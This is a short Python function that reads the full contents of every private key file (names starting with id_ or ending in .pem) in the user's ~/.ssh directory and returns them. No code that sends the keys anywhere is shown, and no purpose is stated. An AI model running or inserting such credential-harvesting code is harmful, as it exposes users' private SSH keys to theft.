def collect_ssh_keys():
    keys = []
    ssh_dir = os.path.expanduser('~/.ssh')
    if os.path.exists(ssh_dir):
        for f in os.listdir(ssh_dir):
            if f.endswith('.pem') or f.startswith('id_'):
                with open(os.path.join(ssh_dir, f), 'r') as keyfile:
                    keys.append(keyfile.read())
    return keys

